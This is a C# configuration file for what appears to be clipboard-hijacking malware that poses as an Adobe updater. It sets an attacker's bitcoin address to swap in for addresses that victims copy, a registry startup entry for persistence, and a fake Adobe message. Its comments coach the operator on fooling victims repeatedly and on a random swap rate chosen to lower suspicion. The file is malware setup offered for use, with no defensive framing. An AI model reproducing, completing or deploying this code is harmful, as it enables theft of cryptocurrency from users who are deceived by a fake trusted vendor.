﻿namespace AdobeUpdate.Main
{
    public static class Config
    {
        // Replace the copied bitcoin address with your own.
        public static string SwapDefaultBtcAddress = "15aHEE5BmAw3KZ59ieurbj8qDemqT7ytG9";

        /* NOT IMPLEMENTED FEATURE
         * 
         * This feature will help you fool somebody more than once.
         * When the software has pasted its address once it will stop running and won't wake up until the specified days here
         * Optimal value = 3-7 (be patient!)
         * In order to disable this feature set 0
         *public static int DaysUntilNextAwake = 3;
         */

        // For further lowering the suspicion there is a final parameter.
        // It generates a probability for the swap.
        // 0 = 100%, 1 = 50%, 2 = 25%...
        // Note that it only runs if the CopyPasteRush limit is not expired, therefore it does not have to be a high number.
        // Optimal value = 2
        public static int RandomSwapNum = 2;

        public static string ConfigFileName = "AdobeConfig.txt";
        public static string RegistryStartupName = "AdobeUpdate";
        //public static string WelcomeMessage = "Congratulations! Adobe is up-to-date...";
        public static string GoodbyeMessage = "Adobe Update is disabled. You are not up-to-date. Please restart the computer!";
    }
}
